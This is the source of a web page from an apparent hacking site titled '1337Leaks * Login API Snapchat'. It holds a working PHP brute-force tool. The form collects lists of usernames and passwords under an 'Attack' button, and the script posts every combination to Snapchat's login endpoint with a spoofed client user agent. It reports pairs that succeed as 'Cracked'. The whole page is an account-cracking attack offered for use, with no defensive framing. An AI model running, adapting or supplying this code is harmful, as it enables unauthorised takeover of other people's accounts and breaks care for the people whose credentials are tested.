<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>1337Leaks * Login API Snapchat</title>
<meta name="title" content="1337Leaks, Leaks, WikiLeaks, 1337r00t, تسريبات, تسريب, تهكير, ثغرات, اختراق, Hacker, Exploits, exploit, Vulnerability" />
<meta name="description" content="1337Leaks, Leaks, WikiLeaks, 1337r00t, تسريبات, تسريب, تهكير, ثغرات, اختراق, Hacker, Exploits, exploit, Vulnerability" />
<meta name="keywords" content="1337Leaks, Leaks, WikiLeaks, 1337r00t, تسريبات, تسريب, تهكير, ثغرات, اختراق, Hacker, Exploits, exploit, Vulnerability" />
<meta name="author" content="1337Leaks.info" />
<meta name="owner" content="1337Leaks.info" />
<link rel="shortcut icon" href="https://i.imgur.com/ca1YlYQ.png" />
<link type="text/css" rel="stylesheet" href="http://1337leaks.info/style.css">
<body dir="ltr" alink="#00ff00" background="http://1337leaks.info/point.gif" bgcolor="#000000" link="#00c000" text="#008000" vlink="#00c000">
</head>
<body>
	<center>
	<table width="668" border="0" cellpadding="3" cellspacing="3" class="main">
  	<tr><td></td></tr><tr><td>
	<table width="597" align="center" border="0">
	<tbody>
	<a href="../index.html" style="font-size: 30px; text-align: center;"><font color="white">< Back to home page</font></a>
	<br>
	<br>
	<br>
	<br>
	<form action="" method="post">
		<font color="yellow">BruteForce SnapChat</font><br><br>
		<br>
		<font color="red">
			<textarea placeholder="Usernames" name="users" cols="20" rows="20"></textarea>
		</font>
		<font color="black">-------</font>
		<font color="red">
			<textarea placeholder="Passwords" name="passs" cols="20" rows="20"></textarea>
		</font>
		<br>
		<br>

<!-- start of form -->		
<input type="submit" name="login" value="Attack">
</form>
<br>
<br>
<br>

<!-- start of php code -->	
<?
function base64($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}
if($_POST['login']){
	if($_POST['users']){
		if($_POST['passs']){
				$users = explode("\r\n", htmlentities($_POST['users']));
				$passs = explode("\r\n", htmlentities($_POST['passs']));
				foreach($users as $username)
				{
				foreach($passs as $password)
				{
					$snapchat = curl_init();
					curl_setopt($snapchat, CURLOPT_URL, "https://app.snapchat.com/loq/login");
					curl_setopt($snapchat, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($snapchat, CURLOPT_FOLLOWLOCATION, false);
					curl_setopt($snapchat, CURLOPT_HTTPHEADER, array(
						'Accept-Language: en;q=0.9',
						'User-Agent: Snapchat/8.8.0.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)'
					));
					curl_setopt($snapchat, CURLOPT_POSTFIELDS, "password=${password}&req_token=9304d151ced17c086eed4ae4ffa57304c7e64d821980ca8b69b43b14ddc5188b&timestamp=1509567052943&username=${username}");
					$response = curl_exec($snapchat);
					if(eregi('Thanks!', $response)){
						echo "<br><font color='blue'>Cracked -> (".htmlspecialchars($username).":".htmlspecialchars($password).")</font><br>";
					}
					else
					{
						if(eregi('password is incorrect', $response)){
							echo "<br><font color='red'>Failed -> (".htmlspecialchars($username).":".htmlspecialchars($password).")</font><br>";
						}
						else
						{
							if(eregi('failed login attempts', $response)){
								echo "<br><font color='pink'>Blocked :( [Your IP -> (".$_SERVER['REMOTE_ADDR'].")]</font><br>";
							}
							else
							{
								if(eregi('Invalid account', $response)){
									echo "<br><font color='orange'>Invalid account -> (".htmlspecialchars($username).")</font><br>";
								}
								else
								{
									echo "<br><font color='pink'>Blocked :( [Your IP -> (".$_SERVER['REMOTE_ADDR'].")]</font><br>";
								}
							}
						}
					}
				}
				}
		}
		else
		{
			echo "<br><br><font color='pink'>   Make sure to enter inputs into both boxes</font>";
		}
	}
	else
	{
		echo "<br><br><font color='pink'>   Make sure to enter inputs into both boxes</font>";
	}
}
?>
</tbody>
</table>
<br>
<b>
	<p>
		<FONT style="FONT-SIZE: 15px">
			Thanks for using
		<br>
		<br>
		Copyright &copy; 2017 
		<a href="http://spectrumspiral.tk">
			spectrumspiral.tk
		</a>
		</FONT>
	</p>
</td>
</tr>
</table>
  <br>
  <br>
</center>
</body>
</html>
